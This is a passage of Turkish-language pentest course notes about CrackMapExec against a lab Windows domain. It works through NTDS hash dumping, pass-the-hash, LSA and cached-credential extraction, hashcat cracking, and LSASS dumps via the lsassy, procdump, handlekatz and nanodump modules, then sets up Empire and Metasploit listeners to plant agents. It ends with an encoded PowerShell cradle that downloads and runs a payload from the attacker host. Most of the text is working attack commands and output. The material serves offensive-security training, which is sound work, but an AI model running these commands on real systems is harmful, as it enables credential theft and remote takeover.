inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c0
8b424ec2d99589a9cce60:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc82
1b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821
b547d09cf28b5864e54b:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93
ac3bf058a5ea0e8fdb71:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831b
ddc88f6d7517615f3d45:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96
ddbd82224270b57f11fc:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87d
f16aafa336fb6ffbbac59:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f
851b949767163c35ae296:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca9
66c5c0b22eba3c8c4c5ae568b1:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2
d0f48967ab753fba96b34:::
SMB 172.16.1.10 445 DC01
inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c9290
84f0efd75791db7cb963d:::
SMB 172.16.1.10 445 DC01
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d
45:::
SMB 172.16.1.10 445 DC01
MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99
c0:::
SMB 172.16.1.10 445 DC01
LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322
dc502:::
SMB 172.16.1.10 445 DC01 [+] Dumped 21 NTDS
hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-
05_162819.ntds of which 18 were added to the database
SMB 172.16.1.10 445 DC01 [*] To extract only
enabled accounts from the output file, run the following command:
SMB 172.16.1.10 445 DC01 [*] cat
/home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-05_162819.ntds | grep -
iv disabled | cut -d ':' -f1

```


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

```
crackmapexec winrm 10.129.204.133 -u administrator -H
30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami

SMB 10.129.204.133 5985 MS01 [*] Windows 10.0 Build
17763 (name:MS01) (domain:MS01)
HTTP 10.129.204.133 5985 MS01 [*]
http://10.129.204.133:5985/wsman
WINRM 10.129.204.133 5985 MS01 [+]
MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
WINRM 10.129.204.133 5985 MS01 [+] Executed command
WINRM 10.129.204.133 5985 MS01 ms01\administrator

```

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --lsa  

SMB         10.129.204.133  445    MS01             
[*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)  

SMB         10.129.204.133  445    MS01             
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)  

SMB         10.129.204.133  445    secrets  

SMB         10.129.204.133  445    MS01             
[+] MS01             
INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT.HTB/david:$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f  

SMB         10.129.204.133  445    MS01             
[+] Dumping LSA  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT.HTB/john:$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:86e98ff8d71ffea8888277605546ff2b8475cc112d81b2a9c3000bb993fa630f  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:350bd90fcadae4e9d7e7dca40f82d316  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:des-cbc-md5:ba234ae034f14c67  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:plain_password_hex:2f671b061503c93e6b673126e95f9086aabbccfe214b1623587574fa982186eab160eb2077b45d7fbcc8c15b0cca80f589423b75e14198cd8ad0f47354c7b48466365384504184dfaf7d7082f25719e8bc710128ae19e66b93a36265ba4623bc26256f2ded1e7154bc65fa7a0e4d8b16d8aaf755b06200e411f4bc8387f09b64976bf7c86b0277b88275fd3fc6e209dbe2b16ac953a2cdf15ac326e54a80d708a01f66a37aa63c6af99e7650c624c18ee3b9f5c839e078d3cd881371b1edf4a904510528d590332a746a455be7f8474688e9e3874821cc41bfa15f12c2d54d1e01ace65ad9331eac018e15e77d6046ac  

SMB         10.129.204.133  445    MS01             
INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:7a09b4655244f2a10ceecf16e7fcdc03:::  

SMB         10.129.204.133  445    MS01             
dpapi_machinekey:0x78f7020d08fa61b3b77b24130b1ecd58f53dd338  
dpapi_userkey:0x4c0d8465c338406d54a1ae09a56223e867907f39  

SMB         10.129.204.133  445    MS01             
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63  

SMB         10.129.204.133  445    INLANEFREIGHT\julio:Password1  
SMB         10.129.204.133  445    INLANEFREIGHT\david:Password2  
SMB         10.129.204.133  445    INLANEFREIGHT\john:Password3  

SMB         10.129.204.133  445    MS01             
[+] Dumped 13 LSA secrets to:  
  /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.secrets  
  /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached  


```


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

```
cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11
08_093944.cached| cut -d ":" -f 2
 $DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
 $DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
 $DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
```


```
 hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 <SNIP>
Dictionary cache hit:
 * Filename..: /usr/share/wordlists/rockyou.txt
 * Passwords.: 14344386
 * Bytes.....: 139921355
 * Keyspace..: 14344386
 $DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1
 <SNIP>
```


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'InlaneFreight01!' -M lsassy

SMB         10.129.204.133 445    MS01         [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)

SMB         10.129.204.133 445    MS01         [+]
inlanefreight.htb\robert:InlaneFreight01! (Pwn3d !!)

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\julio
64f12cdda88057e06a81b54e73b949b

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\david
c39f2beb3d2ec06a2cb887fb391dee0

LSASSY      10.129.204.133 445    MS01         INLANEFREIGHT\john
c4b0e1b0c7ce2c4723b4e2e407ef81a2
```

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
procdump

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
PROCDUMP 10.129.204.133 445 MS01 [*] Copy
/tmp/procdump.exe to C:\Windows\Temp\
PROCDUMP 10.129.204.133 445 MS01 [+] Created file
procdump.exe on the \\C$\Windows\Temp\
PROCDUMP 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\procdump.exe -accepteula -ma 632
C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
PROCDUMP 10.129.204.133 445 MS01 [*] Copy MS01-AMD64-
INLANEFREIGHT.dmp to host
PROCDUMP 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.dmp
PROCDUMP 10.129.204.133 445 MS01 [+] Deleted procdump
file on the C$ share
PROCDUMP 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2

```


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
handlekatz

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
HANDLEKA... 10.129.204.133 445 MS01 [*] Copy
/tmp/handlekatz.exe to C:\Windows\Temp\
HANDLEKA... 10.129.204.133 445 MS01 [+] Created file
handlekatz.exe on the \\C$\Windows\Temp\
HANDLEKA... 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
HANDLEKA... 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\handlekatz.exe --pid:632 --
outfile:C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-
%USERDOMAIN%.log
HANDLEKA... 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
HANDLEKA... 10.129.204.133 445 MS01 [*] Copy MS01-AMD64-
INLANEFREIGHT.log to host
HANDLEKA... 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.log
HANDLEKA... 10.129.204.133 445 MS01 [+] Deleted handlekatz
file on the C$ share
HANDLEKA... 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
HANDLEKA... 10.129.204.133 445 MS01 [*] Deobfuscating,
this might take a while
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
HANDLEKA... 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2

```


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M
nanodump

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
NANODUMP 10.129.204.133 445 MS01 [*] 64-bit Windows
detected.
NANODUMP 10.129.204.133 445 MS01 [+] Created file
nano.exe on the \\C$\Windows\Temp\
NANODUMP 10.129.204.133 445 MS01 [*] Getting lsass PID
tasklist /v /fo csv | findstr /i "lsass"
NANODUMP 10.129.204.133 445 MS01 [*] Executing command
C:\Windows\Temp\nano.exe --pid 632 --write
C:\Windows\Temp\20221108_1148.log
NANODUMP 10.129.204.133 445 MS01 [+] Process lsass.exe
was successfully dumped
NANODUMP 10.129.204.133 445 MS01 [*] Copying
20221108_1148.log to host
NANODUMP 10.129.204.133 445 MS01 [+] Dumpfile of
lsass.exe was transferred to /tmp/cme/MS01_64_inlanefreight.htb.log
NANODUMP 10.129.204.133 445 MS01 [+] Deleted nano file
on the C$ share
NANODUMP 10.129.204.133 445 MS01 [+] Deleted lsass.dmp
file on the C$ share
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
NANODUMP 10.129.204.133 445 MS01
INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2 
```

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

```
git clone --recursive https://github.com/BC-SECURITY/Empire.git -q
cd Empire
sudo su
[!bash!]# curl -sSL https://install.python-poetry.org | python3 -
[!bash!]# poetry install
<SNIP>
```

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

```
[!bash!]# poetry run python empire.py server --username empireadmin --
password asdasd123

[*] Loading default config
[*] Loading bypasses from: /home/plaintext/Empire/empire/server/bypasses/
[*] Loading stagers from: /home/plaintext/Empire/empire/server/stagers/
[*] Loading modules from: /home/plaintext/Empire/empire/server/modules/
[*] Loading listeners from:
/home/plaintext/Empire/empire/server/listeners/
<SNIP>

```

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = smb
pwn3d_label = Pwn3d!
audit_mode =
[BloodHound]
bh_enabled = False
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = neo4j
bh_pass = neo4j
[Empire]
api_host = 127.0.0.1
api_port = 1337
username = empireadmin
password = asdasd123
<SNIP>
```


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

```
[!bash!]# pwd; echo "";cat empire/client/config.yaml
/home/plaintext/Empire
suppress-self-cert-warning: true
auto-copy-stagers: true
servers:
 localhost:
 host: https://localhost
 port: 1337
 socketport: 5000
 username: empireadmin
 password: HackTheBoxCME!
 autoconnect: true
 other-server:
 host: https://localhost
 port: 1337
 socketport: 5000
 username: empireadmin
 password: asdasd123
 another-one:
 host: https://localhost
port: 1337
 socketport: 5000
 username: empireadmin
 password: HackTheBoxCME!
<SNIP>
```


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

```
[!bash!]# poetry run python empire.py client --config
empire/client/config.yaml

Loading config from empire/client/config.yaml
<SNIP>
==========================================================================
==============
[Empire] Post-Exploitation Framework
==========================================================================
==============
[Version] 4.8.1 BC Security Fork | [Web] https://github.com/BCSECURITY/Empire
==========================================================================
==============
[Starkiller] Multi-User GUI | [Web] https://github.com/BCSECURITY/Starkiller
==========================================================================
==============
[Documentation] | [Web] https://bc-security.gitbook.io/empire-wiki/
==========================================================================
==============
 _______ ___ ___ ______ __ ______ _______
 | ____| | \/ | | _ \ | | | _ \ | ____|
 | |__ | \ / | | |_) | | | | |_) | | |__
 | __| | |\/| | | ___/ | | | / | __|
 | |____ | | | | | | | | | |\ \----. | |____
 |_______| |__| |__| | _| |__| | _| `._____| |_______|
 409 modules currently loaded
 0 listeners currently active
 0 agents currently active
[*] Connected to localhost
(Empire) >
```

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

```
(Empire) > uselistener http
Author @harmj0y
Description Starts a http[s] listener (PowerShell or Python) that uses a
GET/POST
 approach.
Name HTTP[S]
<SNIP>
(Empire: uselistener/http) > set Host http://10.10.14.33
[*] Set Host to http://10.10.14.33
(Empire: uselistener/http) > set Port 8001
[*] Set Port to 8001
(Empire: uselistener/http) > execute
[+] Listener http successfully started

```


### Empire Setting up IP and Port

```
(Empire) > uselistener http
Author @harmj0y
Description Starts a http[s] listener (PowerShell or Python) that uses a
GET/POST
 approach.
Name HTTP[S]
<SNIP>
(Empire: uselistener/http) > set Host http://10.10.14.33
[*] Set Host to http://10.10.14.33
(Empire: uselistener/http) > set Port 8001
[*] Set Port to 8001
(Empire: uselistener/http) > execute
[+] Listener http successfully started
```

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

```
crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M empire_exec -o LISTENER=http
EMPIRE_E... [+] Successfully
generated launcher for listener 'http'
SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
EMPIRE_E... 10.129.204.133 445 MS01 [+] Executed Empire Launcher
```


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

```
msfconsole
<SNIP>

msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp

msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
SRVHOST => 10.10.14.33

msf6 exploit(multi/script/web_delivery) > set SRVPORT 8443
SRVPORT => 8443

msf6 exploit(multi/script/web_delivery) > set target 2
target => 2

msf6 exploit(multi/script/web_delivery) > set payload
windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.33
LHOST => 10.10.14.33

msf6 exploit(multi/script/web_delivery) > set LPORT 8002
LPORT => 8002

msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) >
[*] Started reverse TCP handler on 10.10.14.33:8002
[*] Using URL: http://10.10.14.33:8443/2S1jAHS
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e
WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUw
BlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0
AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB5AE8ATwBqAD
0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYA
KABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARA
BlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABu
AHUAbABsACkAewAkAHkATwBPAGoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAH
EAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsA
JAB5AE8ATwBqAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdA
AuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwBy
AGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAH
QAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIA
aQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAzADoAOAA0ADQAMw
AvAE0AdgBYADYAQgBLAHUAagAvAHUAeQBjAEsAWQBaADAAeQB1AEkANQB1ADIATAAnACkAKQA7
AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAG
UAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A
MQAwAC4AMQAwAC4AMQA0AC4AMwAzADoAOAA0ADQAMwAvAE0AdgBYADYAQgBLAHUAagAnACkAKQ
A7AA==

```

